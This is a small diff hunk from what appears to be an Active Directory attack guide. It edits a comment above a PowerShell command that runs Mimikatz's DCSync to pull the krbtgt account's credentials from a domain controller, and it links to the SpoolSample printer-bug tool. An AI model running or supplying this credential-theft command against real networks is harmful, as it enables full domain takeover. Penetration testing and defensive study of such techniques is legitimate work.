@@ -517,7 +517,7 @@ Link: [MS-RPRN](https://github.com/leechristensen/SpoolSample)
 ```
 **4. DCSync attack against Corp using the injected ticket:**
 ```powershell
-# Use the ticket
+# Run DCSync with Mimikatz
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:corp\krbtgt"'
 ```
 
